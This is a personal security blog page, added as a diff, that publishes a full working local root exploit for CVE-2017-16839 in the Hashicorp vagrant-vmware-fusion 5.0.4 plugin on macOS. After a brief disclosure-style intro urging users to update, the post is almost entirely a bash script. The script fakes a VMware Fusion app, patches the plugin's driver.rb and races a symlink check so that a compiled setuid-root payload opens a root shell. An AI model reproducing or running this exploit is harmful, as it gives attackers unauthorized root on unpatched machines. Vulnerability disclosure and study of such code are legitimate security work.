@@ -1,0 +1,268 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+        <link rel="stylesheet" type="text/css" href="/css/style.css" />
+        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+        <script src='https://www.google.com/recaptcha/api.js'></script>
+        <script src="/js/site.js"></script>
+        <title>Mark Wadham</title>
+    </head>
+    <body>
+        <div id="menu">
+                        <h3>Mark Wadham</h3>
+            <ul>
+                <li><a href="/index.html">profile</a></li>
+                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
+                <li><a href="/cves.html">CVEs</a></li>
+                <li><a href="/jsdemos.html">js demos</a></li>
+                <li><a href="/contact.html">contact</a></li>
+                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
+                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
+                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
+                <li class="red space small"></li>
+            </ul>
+
+        </div>
+        <div id="content">
+            <div id="main-content">
+                                            <div class="post">
+                <h2><a href="/blog/cve201716839-hashicorp-vagrantvmwarefusion-v504-local-root.html">CVE-2017-16839 Hashicorp vagrant-vmware-fusion v5.0.4 local root</a></h2>
+                <h3>28 Mar 2018 21:03  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                  <pre>Another exploit for the now deprecated vagrant-vmware-fusion plugin. This one
+only works if VMware Fusion is not installed which is an unlikely scenario.
+However if this should occur then it&#39;s an easy root escalation so users should
+still update.
+
+<a href="https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt</a>
+92d193047970f90f18913cb8a1fe3b326c750dc68a2bc54be6b16e0d899c294a
+------------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo &quot;#########################################################&quot;
+echo &quot;# vagrant_vmware_fusion plugin 5.0.4 local root privesc #&quot;
+echo &quot;# by m4rkw - <a href="https://m4.rkw.io/blog.html                #&quot">https://m4.rkw.io/blog.html                #&quot</a>;
+echo &quot;#########################################################&quot;
+echo &quot;# Note: only works when VMWare Fusion is not installed. #&quot;
+echo &quot;#########################################################&quot;
+echo
+
+cleanup() {
+  exec 2&gt; /dev/null
+  killall -9 vagrant 1&gt;/dev/null 2&gt;/dev/null
+  kill -9 `ps auxwww |egrep &#39;\/vagrant up$&#39; |xargs -L1 |cut -d &#39; &#39; -f2` &amp;&gt;/dev/null
+  exec 2&gt; /dev/tty
+  cd
+  rm -rf .vagrant_vmware_fusion_504_exp
+  rm -rf /Applications/VMware\ Fusion.app
+  mv -f ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb
+}
+
+if [ -e &quot;/Applications/VMware Fusion.app&quot; ] ; then
+  echo &quot;Fusion is installed, not exploitable.&quot;
+  exit 1
+fi
+
+echo &quot;setting up fake app directory...&quot;
+
+mkdir /Applications/VMware\ Fusion.app
+if [ ! $? -eq 0 ] ; then
+  echo &quot;Failed to create /Applications/VMware Fusion.app.&quot;
+  exit 1
+fi
+
+mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
+
+touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+
+cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &lt;&lt;EOF
+#!/bin/bash
+echo 1&gt;&amp;2
+echo &quot;VMware Fusion Information:&quot; 1&gt;&amp;2
+echo &quot;VMware Fusion 10.0.1 build-6754183 Release&quot; 1&gt;&amp;2
+echo
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
+
+cat &gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack &lt;&lt;EOF
+#!/bin/bash
+chown root:wheel /tmp/vvp_504
+chmod 4755 /tmp/vvp_504
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack
+
+echo &quot;compiling payload...&quot;
+
+cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
+#include &lt;unistd.h&gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/vvp_504; /bin/bash&quot;,NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_504 /tmp/vvp_504.c
+rm -f /tmp/vvp_504.c
+
+cd
+mkdir .vagrant_vmware_fusion_504_exp
+cd .vagrant_vmware_fusion_504_exp
+
+echo &quot;writing dummy vagrantfile ...&quot;
+
+cat &gt; vagrantfile &lt;&lt;EOF
+Vagrant.configure(&#39;2&#39;) do |config|
+  config.vm.box = &#39;envimation/ubuntu-xenial&#39;
+end
+EOF
+
+echo &quot;patching driver.rb...&quot;
+
+if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+  mv ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig
+fi
+
+cat &gt; ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb &lt;&lt;EOF
+load File.dirname(__FILE__) + &quot;/driver.rb.orig&quot;
+
+Dir.chdir(&quot;/Applications/VMware Fusion.app/Contents/Library/&quot;)
+
+\`ln -sf /bin/ls vmnet-cli\`
+
+Thread.new do
+  system(&quot;/Users/#{ENV[&quot;USER&quot;]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&quot;)
+end
+
+sleep 1.0/ENV[&quot;DELAY&quot;].to_f
+
+\`ln -sf vmnet-cli.hack vmnet-cli\`
+
+exit 0
+EOF
+
+echo
+echo &quot;attempting to exploit the race condition...&quot;
+echo &quot;(the more loaded the system the longer this will take)&quot;
+echo
+
+echo -n &quot;racing: &quot;
+
+success=0
+i=0
+delay=80
+previous_dir=0
+gap=5
+max_attempts=250
+
+while :
+do
+  export DELAY=&quot;$delay&quot;
+  printf &quot;%x&quot; $DELAY
+
+  x=`vagrant up 2&gt;&amp;1`
+
+  if [ &quot;`echo &quot;$x&quot; |grep &#39;illegal option&#39;`&quot; != &quot;&quot; ] ; then
+    if [ $previous_dir -eq 2 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay+$gap))
+    previous_dir=1
+  elif [ &quot;`echo &quot;$x&quot; |grep &#39;detected invalid ownership&#39;`&quot; != &quot;&quot; ] ; then
+    if [ $previous_dir -eq 1 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay-$gap))
+    previous_dir=2
+  else
+    r=`ls -la /tmp/vvp_504 |grep -- &#39;-rwsr-xr-x  1 root  wheel&#39;`
+    if [ &quot;$r&quot; != &quot;&quot; ] ; then
+      success=1
+      break
+    fi
+  fi
+
+  i=$((i+1))
+
+  if [ $i -eq $max_attempts ] ; then
+    break
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo
+  echo
+  echo &quot;exploit failed.&quot;
+  exit 1
+fi
+
+echo
+echo
+echo &quot;SUCCESS!&quot;
+cd
+/tmp/vvp_504</pre>
+            </div>
+
+
+            </div>
+            <div id="right-content">
+                
+            <ul>
+              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[year]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[tag]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+            </ul>
+
+            </div>
+        </div>
+				<script>
+						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+						ga('create', 'UA-91604161-1', 'auto');
+						ga('send', 'pageview');
+				</script>
+    </body>
+</html>
